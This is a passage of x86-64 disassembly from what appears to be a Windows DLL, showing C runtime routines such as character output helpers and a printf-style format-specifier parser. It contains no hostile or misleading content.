   180001709:	89 43 08             	mov    %eax,0x8(%rbx)
   18000170c:	85 ed                	test   %ebp,%ebp
   18000170e:	7e 19                	jle    0x180001729
   180001710:	44 8b c5             	mov    %ebp,%r8d
   180001713:	8b ce                	mov    %esi,%ecx
   180001715:	e8 9e 2f 00 00       	call   0x1800046b8
   18000171a:	8b f8                	mov    %eax,%edi
   18000171c:	eb 57                	jmp    0x180001775
   18000171e:	83 c9 20             	or     $0x20,%ecx
   180001721:	89 4b 18             	mov    %ecx,0x18(%rbx)
   180001724:	e9 3f ff ff ff       	jmp    0x180001668
   180001729:	83 fe ff             	cmp    $0xffffffff,%esi
   18000172c:	74 23                	je     0x180001751
   18000172e:	83 fe fe             	cmp    $0xfffffffe,%esi
   180001731:	74 1e                	je     0x180001751
   180001733:	48 8b ce             	mov    %rsi,%rcx
   180001736:	48 8b c6             	mov    %rsi,%rax
   180001739:	48 8d 15 e0 dc 00 00 	lea    0xdce0(%rip),%rdx        # 0x18000f420
   180001740:	83 e1 1f             	and    $0x1f,%ecx
   180001743:	48 c1 f8 05          	sar    $0x5,%rax
   180001747:	48 6b c9 58          	imul   $0x58,%rcx,%rcx
   18000174b:	48 03 0c c2          	add    (%rdx,%rax,8),%rcx
   18000174f:	eb 07                	jmp    0x180001758
   180001751:	48 8d 0d 38 aa 00 00 	lea    0xaa38(%rip),%rcx        # 0x18000c190
   180001758:	f6 41 08 20          	testb  $0x20,0x8(%rcx)
   18000175c:	74 17                	je     0x180001775
   18000175e:	33 d2                	xor    %edx,%edx
   180001760:	8b ce                	mov    %esi,%ecx
   180001762:	44 8d 42 02          	lea    0x2(%rdx),%r8d
   180001766:	e8 09 27 00 00       	call   0x180003e74
   18000176b:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   18000176f:	0f 84 ef fe ff ff    	je     0x180001664
   180001775:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   180001779:	8a 44 24 30          	mov    0x30(%rsp),%al
   18000177d:	88 01                	mov    %al,(%rcx)
   18000177f:	eb 16                	jmp    0x180001797
   180001781:	bd 01 00 00 00       	mov    $0x1,%ebp
   180001786:	48 8d 54 24 30       	lea    0x30(%rsp),%rdx
   18000178b:	8b ce                	mov    %esi,%ecx
   18000178d:	44 8b c5             	mov    %ebp,%r8d
   180001790:	e8 23 2f 00 00       	call   0x1800046b8
   180001795:	8b f8                	mov    %eax,%edi
   180001797:	3b fd                	cmp    %ebp,%edi
   180001799:	0f 85 c5 fe ff ff    	jne    0x180001664
   18000179f:	0f b6 44 24 30       	movzbl 0x30(%rsp),%eax
   1800017a4:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   1800017a9:	48 8b 6c 24 40       	mov    0x40(%rsp),%rbp
   1800017ae:	48 8b 74 24 48       	mov    0x48(%rsp),%rsi
   1800017b3:	48 83 c4 20          	add    $0x20,%rsp
   1800017b7:	5f                   	pop    %rdi
   1800017b8:	c3                   	ret
   1800017b9:	cc                   	int3
   1800017ba:	cc                   	int3
   1800017bb:	cc                   	int3
   1800017bc:	40 53                	rex push %rbx
   1800017be:	48 83 ec 20          	sub    $0x20,%rsp
   1800017c2:	48 8b d9             	mov    %rcx,%rbx
   1800017c5:	c6 41 18 00          	movb   $0x0,0x18(%rcx)
   1800017c9:	48 85 d2             	test   %rdx,%rdx
   1800017cc:	75 7f                	jne    0x18000184d
   1800017ce:	e8 c9 12 00 00       	call   0x180002a9c
   1800017d3:	48 89 43 10          	mov    %rax,0x10(%rbx)
   1800017d7:	48 8b 90 c0 00 00 00 	mov    0xc0(%rax),%rdx
   1800017de:	48 89 13             	mov    %rdx,(%rbx)
   1800017e1:	48 8b 88 b8 00 00 00 	mov    0xb8(%rax),%rcx
   1800017e8:	48 89 4b 08          	mov    %rcx,0x8(%rbx)
   1800017ec:	48 3b 15 1d b7 00 00 	cmp    0xb71d(%rip),%rdx        # 0x18000cf10
   1800017f3:	74 16                	je     0x18000180b
   1800017f5:	8b 80 c8 00 00 00    	mov    0xc8(%rax),%eax
   1800017fb:	85 05 df b2 00 00    	test   %eax,0xb2df(%rip)        # 0x18000cae0
   180001801:	75 08                	jne    0x18000180b
   180001803:	e8 cc 3d 00 00       	call   0x1800055d4
   180001808:	48 89 03             	mov    %rax,(%rbx)
   18000180b:	48 8b 05 ce b1 00 00 	mov    0xb1ce(%rip),%rax        # 0x18000c9e0
   180001812:	48 39 43 08          	cmp    %rax,0x8(%rbx)
   180001816:	74 1b                	je     0x180001833
   180001818:	48 8b 43 10          	mov    0x10(%rbx),%rax
   18000181c:	8b 88 c8 00 00 00    	mov    0xc8(%rax),%ecx
   180001822:	85 0d b8 b2 00 00    	test   %ecx,0xb2b8(%rip)        # 0x18000cae0
   180001828:	75 09                	jne    0x180001833
   18000182a:	e8 d5 34 00 00       	call   0x180004d04
   18000182f:	48 89 43 08          	mov    %rax,0x8(%rbx)
   180001833:	48 8b 43 10          	mov    0x10(%rbx),%rax
   180001837:	f6 80 c8 00 00 00 02 	testb  $0x2,0xc8(%rax)
   18000183e:	75 14                	jne    0x180001854
   180001840:	83 88 c8 00 00 00 02 	orl    $0x2,0xc8(%rax)
   180001847:	c6 43 18 01          	movb   $0x1,0x18(%rbx)
   18000184b:	eb 07                	jmp    0x180001854
   18000184d:	0f 10 02             	movups (%rdx),%xmm0
   180001850:	f3 0f 7f 01          	movdqu %xmm0,(%rcx)
   180001854:	48 8b c3             	mov    %rbx,%rax
   180001857:	48 83 c4 20          	add    $0x20,%rsp
   18000185b:	5b                   	pop    %rbx
   18000185c:	c3                   	ret
   18000185d:	cc                   	int3
   18000185e:	cc                   	int3
   18000185f:	cc                   	int3
   180001860:	40 53                	rex push %rbx
   180001862:	48 83 ec 20          	sub    $0x20,%rsp
   180001866:	f6 42 18 40          	testb  $0x40,0x18(%rdx)
   18000186a:	49 8b d8             	mov    %r8,%rbx
   18000186d:	74 0c                	je     0x18000187b
   18000186f:	48 83 7a 10 00       	cmpq   $0x0,0x10(%rdx)
   180001874:	75 05                	jne    0x18000187b
   180001876:	41 ff 00             	incl   (%r8)
   180001879:	eb 25                	jmp    0x1800018a0
   18000187b:	ff 4a 08             	decl   0x8(%rdx)
   18000187e:	78 0d                	js     0x18000188d
   180001880:	48 8b 02             	mov    (%rdx),%rax
   180001883:	88 08                	mov    %cl,(%rax)
   180001885:	48 ff 02             	incq   (%rdx)
   180001888:	0f b6 c1             	movzbl %cl,%eax
   18000188b:	eb 08                	jmp    0x180001895
   18000188d:	0f be c9             	movsbl %cl,%ecx
   180001890:	e8 97 fd ff ff       	call   0x18000162c
   180001895:	83 f8 ff             	cmp    $0xffffffff,%eax
   180001898:	75 04                	jne    0x18000189e
   18000189a:	09 03                	or     %eax,(%rbx)
   18000189c:	eb 02                	jmp    0x1800018a0
   18000189e:	ff 03                	incl   (%rbx)
   1800018a0:	48 83 c4 20          	add    $0x20,%rsp
   1800018a4:	5b                   	pop    %rbx
   1800018a5:	c3                   	ret
   1800018a6:	cc                   	int3
   1800018a7:	cc                   	int3
   1800018a8:	85 d2                	test   %edx,%edx
   1800018aa:	7e 4c                	jle    0x1800018f8
   1800018ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1800018b1:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1800018b6:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1800018bb:	57                   	push   %rdi
   1800018bc:	48 83 ec 20          	sub    $0x20,%rsp
   1800018c0:	49 8b f9             	mov    %r9,%rdi
   1800018c3:	49 8b f0             	mov    %r8,%rsi
   1800018c6:	8b da                	mov    %edx,%ebx
   1800018c8:	40 8a e9             	mov    %cl,%bpl
   1800018cb:	4c 8b c7             	mov    %rdi,%r8
   1800018ce:	48 8b d6             	mov    %rsi,%rdx
   1800018d1:	40 8a cd             	mov    %bpl,%cl
   1800018d4:	ff cb                	dec    %ebx
   1800018d6:	e8 85 ff ff ff       	call   0x180001860
   1800018db:	83 3f ff             	cmpl   $0xffffffff,(%rdi)
   1800018de:	74 04                	je     0x1800018e4
   1800018e0:	85 db                	test   %ebx,%ebx
   1800018e2:	7f e7                	jg     0x1800018cb
   1800018e4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1800018e9:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1800018ee:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1800018f3:	48 83 c4 20          	add    $0x20,%rsp
   1800018f7:	5f                   	pop    %rdi
   1800018f8:	c3                   	ret
   1800018f9:	cc                   	int3
   1800018fa:	cc                   	int3
   1800018fb:	cc                   	int3
   1800018fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   180001901:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   180001906:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   18000190b:	57                   	push   %rdi
   18000190c:	41 54                	push   %r12
   18000190e:	41 55                	push   %r13
   180001910:	48 83 ec 20          	sub    $0x20,%rsp
   180001914:	41 f6 40 18 40       	testb  $0x40,0x18(%r8)
   180001919:	48 8b 5c 24 60       	mov    0x60(%rsp),%rbx
   18000191e:	49 8b f9             	mov    %r9,%rdi
   180001921:	44 8b 23             	mov    (%rbx),%r12d
   180001924:	49 8b e8             	mov    %r8,%rbp
   180001927:	8b f2                	mov    %edx,%esi
   180001929:	4c 8b e9             	mov    %rcx,%r13
   18000192c:	74 0c                	je     0x18000193a
   18000192e:	49 83 78 10 00       	cmpq   $0x0,0x10(%r8)
   180001933:	75 05                	jne    0x18000193a
   180001935:	41 01 11             	add    %edx,(%r9)
   180001938:	eb 3e                	jmp    0x180001978
   18000193a:	83 23 00             	andl   $0x0,(%rbx)
   18000193d:	85 d2                	test   %edx,%edx
   18000193f:	7e 34                	jle    0x180001975
   180001941:	41 8a 4d 00          	mov    0x0(%r13),%cl
   180001945:	4c 8b c7             	mov    %rdi,%r8
   180001948:	48 8b d5             	mov    %rbp,%rdx
   18000194b:	ff ce                	dec    %esi
   18000194d:	e8 0e ff ff ff       	call   0x180001860
   180001952:	49 ff c5             	inc    %r13
   180001955:	83 3f ff             	cmpl   $0xffffffff,(%rdi)
   180001958:	75 12                	jne    0x18000196c
   18000195a:	83 3b 2a             	cmpl   $0x2a,(%rbx)
   18000195d:	75 11                	jne    0x180001970
   18000195f:	4c 8b c7             	mov    %rdi,%r8
   180001962:	48 8b d5             	mov    %rbp,%rdx
   180001965:	b1 3f                	mov    $0x3f,%cl
   180001967:	e8 f4 fe ff ff       	call   0x180001860
   18000196c:	85 f6                	test   %esi,%esi
   18000196e:	7f d1                	jg     0x180001941
   180001970:	83 3b 00             	cmpl   $0x0,(%rbx)
   180001973:	75 03                	jne    0x180001978
   180001975:	44 89 23             	mov    %r12d,(%rbx)
   180001978:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   18000197d:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   180001982:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   180001987:	48 83 c4 20          	add    $0x20,%rsp
   18000198b:	41 5d                	pop    %r13
   18000198d:	41 5c                	pop    %r12
   18000198f:	5f                   	pop    %rdi
   180001990:	c3                   	ret
   180001991:	cc                   	int3
   180001992:	cc                   	int3
   180001993:	cc                   	int3
   180001994:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   180001999:	55                   	push   %rbp
   18000199a:	56                   	push   %rsi
   18000199b:	57                   	push   %rdi
   18000199c:	41 54                	push   %r12
   18000199e:	41 55                	push   %r13
   1800019a0:	41 56                	push   %r14
   1800019a2:	41 57                	push   %r15
   1800019a4:	48 8d ac 24 30 fe ff 	lea    -0x1d0(%rsp),%rbp
   1800019ab:	ff 
   1800019ac:	48 81 ec d0 02 00 00 	sub    $0x2d0,%rsp
   1800019b3:	48 8b 05 b6 b5 00 00 	mov    0xb5b6(%rip),%rax        # 0x18000cf70
   1800019ba:	48 33 c4             	xor    %rsp,%rax
   1800019bd:	48 89 85 c8 01 00 00 	mov    %rax,0x1c8(%rbp)
   1800019c4:	33 c0                	xor    %eax,%eax
   1800019c6:	48 8b d9             	mov    %rcx,%rbx
   1800019c9:	48 89 4c 24 70       	mov    %rcx,0x70(%rsp)
   1800019ce:	48 89 54 24 68       	mov    %rdx,0x68(%rsp)
   1800019d3:	48 8d 4d 80          	lea    -0x80(%rbp),%rcx
   1800019d7:	49 8b d0             	mov    %r8,%rdx
   1800019da:	4d 8b f1             	mov    %r9,%r14
   1800019dd:	89 44 24 64          	mov    %eax,0x64(%rsp)
   1800019e1:	44 8b e8             	mov    %eax,%r13d
   1800019e4:	89 44 24 58          	mov    %eax,0x58(%rsp)
   1800019e8:	8b f8                	mov    %eax,%edi
   1800019ea:	89 44 24 44          	mov    %eax,0x44(%rsp)
   1800019ee:	89 44 24 4c          	mov    %eax,0x4c(%rsp)
   1800019f2:	89 44 24 5c          	mov    %eax,0x5c(%rsp)
   1800019f6:	89 44 24 54          	mov    %eax,0x54(%rsp)
   1800019fa:	e8 bd fd ff ff       	call   0x1800017bc
   1800019ff:	e8 9c 0c 00 00       	call   0x1800026a0
   180001a04:	45 33 d2             	xor    %r10d,%r10d
   180001a07:	48 89 45 a0          	mov    %rax,-0x60(%rbp)
   180001a0b:	48 85 db             	test   %rbx,%rbx
   180001a0e:	75 2c                	jne    0x180001a3c
   180001a10:	e8 8b 0c 00 00       	call   0x1800026a0
   180001a15:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180001a1b:	e8 18 0c 00 00       	call   0x180002638
   180001a20:	45 33 db             	xor    %r11d,%r11d
   180001a23:	44 38 5d 98          	cmp    %r11b,-0x68(%rbp)
   180001a27:	74 0b                	je     0x180001a34
   180001a29:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   180001a2d:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   180001a34:	83 c8 ff             	or     $0xffffffff,%eax
   180001a37:	e9 ba 07 00 00       	jmp    0x1800021f6
   180001a3c:	41 83 cf ff          	or     $0xffffffff,%r15d
   180001a40:	f6 43 18 40          	testb  $0x40,0x18(%rbx)
   180001a44:	4c 8d 0d b5 e5 ff ff 	lea    -0x1a4b(%rip),%r9        # 0x180000000
   180001a4b:	0f 85 a5 00 00 00    	jne    0x180001af6
   180001a51:	48 8b cb             	mov    %rbx,%rcx
   180001a54:	e8 07 30 00 00       	call   0x180004a60
   180001a59:	48 8d 15 30 a7 00 00 	lea    0xa730(%rip),%rdx        # 0x18000c190
   180001a60:	41 3b c7             	cmp    %r15d,%eax
   180001a63:	74 28                	je     0x180001a8d
   180001a65:	83 f8 fe             	cmp    $0xfffffffe,%eax
   180001a68:	74 23                	je     0x180001a8d
   180001a6a:	4c 63 c0             	movslq %eax,%r8
   180001a6d:	4c 8d 0d 8c e5 ff ff 	lea    -0x1a74(%rip),%r9        # 0x180000000
   180001a74:	49 8b c8             	mov    %r8,%rcx
   180001a77:	41 83 e0 1f          	and    $0x1f,%r8d
   180001a7b:	48 c1 f9 05          	sar    $0x5,%rcx
   180001a7f:	4d 6b c0 58          	imul   $0x58,%r8,%r8
   180001a83:	4d 03 84 c9 20 f4 00 	add    0xf420(%r9,%rcx,8),%r8
   180001a8a:	00 
   180001a8b:	eb 0a                	jmp    0x180001a97
   180001a8d:	4c 8b c2             	mov    %rdx,%r8
   180001a90:	4c 8d 0d 69 e5 ff ff 	lea    -0x1a97(%rip),%r9        # 0x180000000
   180001a97:	41 f6 40 38 7f       	testb  $0x7f,0x38(%r8)
   180001a9c:	75 29                	jne    0x180001ac7
   180001a9e:	41 3b c7             	cmp    %r15d,%eax
   180001aa1:	74 1e                	je     0x180001ac1
   180001aa3:	83 f8 fe             	cmp    $0xfffffffe,%eax
   180001aa6:	74 19                	je     0x180001ac1
   180001aa8:	48 63 d0             	movslq %eax,%rdx
   180001aab:	48 8b c2             	mov    %rdx,%rax
   180001aae:	83 e2 1f             	and    $0x1f,%edx
   180001ab1:	48 c1 f8 05          	sar    $0x5,%rax
   180001ab5:	48 6b d2 58          	imul   $0x58,%rdx,%rdx
   180001ab9:	49 03 94 c1 20 f4 00 	add    0xf420(%r9,%rax,8),%rdx
   180001ac0:	00 
   180001ac1:	f6 42 38 80          	testb  $0x80,0x38(%rdx)
   180001ac5:	74 2c                	je     0x180001af3
   180001ac7:	e8 d4 0b 00 00       	call   0x1800026a0
   180001acc:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   180001ad2:	e8 61 0b 00 00       	call   0x180002638
   180001ad7:	45 33 db             	xor    %r11d,%r11d
   180001ada:	44 38 5d 98          	cmp    %r11b,-0x68(%rbp)
   180001ade:	74 0b                	je     0x180001aeb
   180001ae0:	48 8b 45 90          	mov    -0x70(%rbp),%rax
   180001ae4:	83 a0 c8 00 00 00 fd 	andl   $0xfffffffd,0xc8(%rax)
   180001aeb:	41 8b c7             	mov    %r15d,%eax
   180001aee:	e9 03 07 00 00       	jmp    0x1800021f6
   180001af3:	45 33 d2             	xor    %r10d,%r10d
   180001af6:	4c 8b 44 24 68       	mov    0x68(%rsp),%r8
   180001afb:	4d 85 c0             	test   %r8,%r8
   180001afe:	74 c7                	je     0x180001ac7
   180001b00:	45 8a 20             	mov    (%r8),%r12b
   180001b03:	41 8b f2             	mov    %r10d,%esi
   180001b06:	44 89 54 24 40       	mov    %r10d,0x40(%rsp)
   180001b0b:	44 89 54 24 48       	mov    %r10d,0x48(%rsp)
   180001b10:	41 8b d2             	mov    %r10d,%edx
   180001b13:	4c 89 55 b0          	mov    %r10,-0x50(%rbp)
   180001b17:	45 84 e4             	test   %r12b,%r12b
   180001b1a:	0f 84 c3 06 00 00    	je     0x1800021e3
   180001b20:	48 8b 5d b8          	mov    -0x48(%rbp),%rbx
   180001b24:	41 bb 00 02 00 00    	mov    $0x200,%r11d
   180001b2a:	49 ff c0             	inc    %r8
   180001b2d:	4c 89 44 24 68       	mov    %r8,0x68(%rsp)
   180001b32:	85 f6                	test   %esi,%esi
   180001b34:	0f 88 a9 06 00 00    	js     0x1800021e3
   180001b3a:	41 8d 44 24 e0       	lea    -0x20(%r12),%eax
   180001b3f:	3c 58                	cmp    $0x58,%al
   180001b41:	77 12                	ja     0x180001b55
   180001b43:	49 0f be c4          	movsbq %r12b,%rax
   180001b47:	42 0f be 8c 08 e0 92 	movsbl 0x92e0(%rax,%r9,1),%ecx
   180001b4e:	00 00 
   180001b50:	83 e1 0f             	and    $0xf,%ecx
   180001b53:	eb 03                	jmp    0x180001b58
   180001b55:	41 8b ca             	mov    %r10d,%ecx
   180001b58:	48 63 c2             	movslq %edx,%rax
   180001b5b:	48 63 c9             	movslq %ecx,%rcx
   180001b5e:	48 8d 14 c8          	lea    (%rax,%rcx,8),%rdx
   180001b62:	42 0f be 94 0a 00 93 	movsbl 0x9300(%rdx,%r9,1),%edx
   180001b69:	00 00 
   180001b6b:	c1 fa 04             	sar    $0x4,%edx
   180001b6e:	89 54 24 60          	mov    %edx,0x60(%rsp)
   180001b72:	8b ca                	mov    %edx,%ecx
   180001b74:	85 d2                	test   %edx,%edx
   180001b76:	0f 84 51 07 00 00    	je     0x1800022cd
   180001b7c:	ff c9                	dec    %ecx
   180001b7e:	0f 84 7a 08 00 00    	je     0x1800023fe
   180001b84:	ff c9                	dec    %ecx
   180001b86:	0f 84 22 08 00 00    	je     0x1800023ae
   180001b8c:	ff c9                	dec    %ecx
   180001b8e:	0f 84 e1 07 00 00    	je     0x180002375
   180001b94:	ff c9                	dec    %ecx
   180001b96:	0f 84 cc 07 00 00    	je     0x180002368
   180001b9c:	ff c9                	dec    %ecx
   180001b9e:	0f 84 8a 07 00 00    	je     0x18000232e
   180001ba4:	ff c9                	dec    %ecx
   180001ba6:	0f 84 74 06 00 00    	je     0x180002220
   180001bac:	ff c9                	dec    %ecx
   180001bae:	0f 85 23 06 00 00    	jne    0x1800021d7
   180001bb4:	41 0f be c4          	movsbl %r12b,%eax
   180001bb8:	83 f8 64             	cmp    $0x64,%eax
   180001bbb:	0f 8f 73 01 00 00    	jg     0x180001d34
   180001bc1:	0f 84 6e 02 00 00    	je     0x180001e35
   180001bc7:	83 f8 41             	cmp    $0x41,%eax
   180001bca:	0f 84 38 01 00 00    	je     0x180001d08
   180001bd0:	83 f8 43             	cmp    $0x43,%eax
   180001bd3:	0f 84 d5 00 00 00    	je     0x180001cae
   180001bd9:	83 f8 45             	cmp    $0x45,%eax
   180001bdc:	0f 84 26 01 00 00    	je     0x180001d08
   180001be2:	83 f8 47             	cmp    $0x47,%eax
   180001be5:	0f 84 1d 01 00 00    	je     0x180001d08
   180001beb:	83 f8 53             	cmp    $0x53,%eax
   180001bee:	74 74                	je     0x180001c64
   180001bf0:	83 f8 58             	cmp    $0x58,%eax
   180001bf3:	0f 84 d6 01 00 00    	je     0x180001dcf
   180001bf9:	83 f8 5a             	cmp    $0x5a,%eax
   180001bfc:	74 17                	je     0x180001c15
   180001bfe:	83 f8 61             	cmp    $0x61,%eax
   180001c01:	0f 84 0d 01 00 00    	je     0x180001d14
   180001c07:	83 f8 63             	cmp    $0x63,%eax
   180001c0a:	0f 84 ac 00 00 00    	je     0x180001cbc
   180001c10:	e9 2b 04 00 00       	jmp    0x180002040
   180001c15:	49 8b 06             	mov    (%r14),%rax
   180001c18:	49 83 c6 08          	add    $0x8,%r14
   180001c1c:	48 85 c0             	test   %rax,%rax
   180001c1f:	74 2f                	je     0x180001c50
   180001c21:	48 8b 58 08          	mov    0x8(%rax),%rbx
   180001c25:	48 85 db             	test   %rbx,%rbx
   180001c28:	74 26                	je     0x180001c50
   180001c2a:	0f bf 00             	movswl (%rax),%eax
   180001c2d:	41 0f ba e5 0b       	bt     $0xb,%r13d
   180001c32:	73 12                	jae    0x180001c46
   180001c34:	99                   	cltd
   180001c35:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180001c3c:	00 
   180001c3d:	2b c2                	sub    %edx,%eax
   180001c3f:	d1 f8                	sar    $1,%eax
   180001c41:	e9 f6 03 00 00       	jmp    0x18000203c
   180001c46:	44 89 54 24 54       	mov    %r10d,0x54(%rsp)
   180001c4b:	e9 ec 03 00 00       	jmp    0x18000203c
   180001c50:	48 8b 1d a9 a3 00 00 	mov    0xa3a9(%rip),%rbx        # 0x18000c000
   180001c57:	48 8b cb             	mov    %rbx,%rcx
   180001c5a:	e8 41 3d 00 00       	call   0x1800059a0
   180001c5f:	e9 d5 03 00 00       	jmp    0x180002039
   180001c64:	41 f7 c5 30 08 00 00 	test   $0x830,%r13d
   180001c6b:	75 05                	jne    0x180001c72
   180001c6d:	41 0f ba ed 0b       	bts    $0xb,%r13d
   180001c72:	49 8b 1e             	mov    (%r14),%rbx
   180001c75:	41 3b ff             	cmp    %r15d,%edi
   180001c78:	8b c7                	mov    %edi,%eax
   180001c7a:	b9 ff ff ff 7f       	mov    $0x7fffffff,%ecx
   180001c7f:	0f 44 c1             	cmove  %ecx,%eax
   180001c82:	49 83 c6 08          	add    $0x8,%r14
   180001c86:	41 f7 c5 10 08 00 00 	test   $0x810,%r13d
   180001c8d:	0f 84 09 01 00 00    	je     0x180001d9c
   180001c93:	48 85 db             	test   %rbx,%rbx
   180001c96:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   180001c9d:	00 
   180001c9e:	48 0f 44 1d 62 a3 00 	cmove  0xa362(%rip),%rbx        # 0x18000c008
   180001ca5:	00 
   180001ca6:	48 8b cb             	mov    %rbx,%rcx
   180001ca9:	e9 e2 00 00 00       	jmp    0x180001d90
   180001cae:	41 f7 c5 30 08 00 00 	test   $0x830,%r13d
   180001cb5:	75 05                	jne    0x180001cbc
   180001cb7:	41 0f ba ed 0b       	bts    $0xb,%r13d
   180001cbc:	49 83 c6 08          	add    $0x8,%r14
   180001cc0:	41 f7 c5 10 08 00 00 	test   $0x810,%r13d
   180001cc7:	74 27                	je     0x180001cf0
   180001cc9:	45 0f b7 4e f8       	movzwl -0x8(%r14),%r9d
   180001cce:	48 8d 55 c0          	lea    -0x40(%rbp),%rdx
   180001cd2:	48 8d 4c 24 48       	lea    0x48(%rsp),%rcx
   180001cd7:	4d 8b c3             	mov    %r11,%r8
   180001cda:	e8 95 3c 00 00       	call   0x180005974
   180001cdf:	45 33 d2             	xor    %r10d,%r10d
   180001ce2:	85 c0                	test   %eax,%eax
   180001ce4:	74 19                	je     0x180001cff
   180001ce6:	c7 44 24 5c 01 00 00 	movl   $0x1,0x5c(%rsp)
   180001ced:	00 
   180001cee:	eb 0f                	jmp    0x180001cff
   180001cf0:	41 8a 46 f8          	mov    -0x8(%r14),%al
   180001cf4:	c7 44 24 48 01 00 00 	movl   $0x1,0x48(%rsp)
   180001cfb:	00 
   180001cfc:	88 45 c0             	mov    %al,-0x40(%rbp)
   180001cff:	48 8d 5d c0          	lea    -0x40(%rbp),%rbx
   180001d03:	e9 38 03 00 00       	jmp    0x180002040
   180001d08:	c7 44 24 78 01 00 00 	movl   $0x1,0x78(%rsp)
   180001d0f:	00 
   180001d10:	41 80 c4 20          	add    $0x20,%r12b
   180001d14:	41 83 cd 40          	or     $0x40,%r13d
   180001d18:	48 8d 5d c0          	lea    -0x40(%rbp),%rbx
   180001d1c:	41 8b f3             	mov    %r11d,%esi
   180001d1f:	85 ff                	test   %edi,%edi
   180001d21:	0f 89 1e 02 00 00    	jns    0x180001f45
   180001d27:	c7 44 24 44 06 00 00 	movl   $0x6,0x44(%rsp)
   180001d2e:	00 
   180001d2f:	e9 5c 02 00 00       	jmp    0x180001f90
   180001d34:	83 f8 65             	cmp    $0x65,%eax
   180001d37:	0f 8c 03 03 00 00    	jl     0x180002040
   180001d3d:	83 f8 67             	cmp    $0x67,%eax
   180001d40:	7e d2                	jle    0x180001d14
   180001d42:	83 f8 69             	cmp    $0x69,%eax
   180001d45:	0f 84 ea 00 00 00    	je     0x180001e35
   180001d4b:	83 f8 6e             	cmp    $0x6e,%eax
   180001d4e:	0f 84 b0 00 00 00    	je     0x180001e04
   180001d54:	83 f8 6f             	cmp    $0x6f,%eax
   180001d57:	0f 84 97 00 00 00    	je     0x180001df4
   180001d5d:	83 f8 70             	cmp    $0x70,%eax
   180001d60:	74 63                	je     0x180001dc5
   180001d62:	83 f8 73             	cmp    $0x73,%eax
   180001d65:	0f 84 07 ff ff ff    	je     0x180001c72
   180001d6b:	83 f8 75             	cmp    $0x75,%eax
   180001d6e:	0f 84 c5 00 00 00    	je     0x180001e39
   180001d74:	83 f8 78             	cmp    $0x78,%eax
   180001d77:	0f 85 c3 02 00 00    	jne    0x180002040
   180001d7d:	b8 27 00 00 00       	mov    $0x27,%eax
   180001d82:	eb 50                	jmp    0x180001dd4
   180001d84:	ff c8                	dec    %eax
   180001d86:	66 44 39 11          	cmp    %r10w,(%rcx)
   180001d8a:	74 08                	je     0x180001d94
   180001d8c:	48 83 c1 02          	add    $0x2,%rcx
   180001d90:	85 c0                	test   %eax,%eax
   180001d92:	75 f0                	jne    0x180001d84
   180001d94:	48 2b cb             	sub    %rbx,%rcx
   180001d97:	48 d1 f9             	sar    $1,%rcx
   180001d9a:	eb 20                	jmp    0x180001dbc
   180001d9c:	48 85 db             	test   %rbx,%rbx
   180001d9f:	48 0f 44 1d 59 a2 00 	cmove  0xa259(%rip),%rbx        # 0x18000c000
   180001da6:	00 
   180001da7:	48 8b cb             	mov    %rbx,%rcx
   180001daa:	eb 0a                	jmp    0x180001db6
   180001dac:	ff c8                	dec    %eax
   180001dae:	44 38 11             	cmp    %r10b,(%rcx)
   180001db1:	74 07                	je     0x180001dba
   180001db3:	48 ff c1             	inc    %rcx
   180001db6:	85 c0                	test   %eax,%eax
   180001db8:	75 f2                	jne    0x180001dac
   180001dba:	2b cb                	sub    %ebx,%ecx
   180001dbc:	89 4c 24 48          	mov    %ecx,0x48(%rsp)
   180001dc0:	e9 7b 02 00 00       	jmp    0x180002040
   180001dc5:	bf 10 00 00 00       	mov    $0x10,%edi
   180001dca:	41 0f ba ed 0f       	bts    $0xf,%r13d
   180001dcf:	b8 07 00 00 00       	mov    $0x7,%eax
   180001dd4:	89 44 24 64          	mov    %eax,0x64(%rsp)
   180001dd8:	41 b9 10 00 00 00    	mov    $0x10,%r9d
   180001dde:	45 84 ed             	test   %r13b,%r13b
   180001de1:	79 5c                	jns    0x180001e3f
   180001de3:	04 51                	add    $0x51,%al
   180001de5:	c6 44 24 50 30       	movb   $0x30,0x50(%rsp)
   180001dea:	41 8d 51 f2          	lea    -0xe(%r9),%edx
   180001dee:	88 44 24 51          	mov    %al,0x51(%rsp)
   180001df2:	eb 4f                	jmp    0x180001e43
   180001df4:	41 b9 08 00 00 00    	mov    $0x8,%r9d
   180001dfa:	45 84 ed             	test   %r13b,%r13b
   180001dfd:	79 40                	jns    0x180001e3f
   180001dff:	45 0b eb             	or     %r11d,%r13d
   180001e02:	eb 3b                	jmp    0x180001e3f
   180001e04:	49 8b 3e             	mov    (%r14),%rdi
   180001e07:	49 83 c6 08          	add    $0x8,%r14
   180001e0b:	e8 88 39 00 00       	call   0x180005798
   180001e10:	45 33 d2             	xor    %r10d,%r10d
   180001e13:	85 c0                	test   %eax,%eax
   180001e15:	0f 84 ac fc ff ff    	je     0x180001ac7
   180001e1b:	41 f6 c5 20          	test   $0x20,%r13b
   180001e1f:	74 05                	je     0x180001e26
   180001e21:	66 89 37             	mov    %si,(%rdi)
   180001e24:	eb 02                	jmp    0x180001e28
   180001e26:	89 37                	mov    %esi,(%rdi)
   180001e28:	c7 44 24 5c 01 00 00 	movl   $0x1,0x5c(%rsp)
   180001e2f:	00 
   180001e30:	e9 70 03 00 00       	jmp    0x1800021a5
   180001e35:	41 83 cd 40          	or     $0x40,%r13d
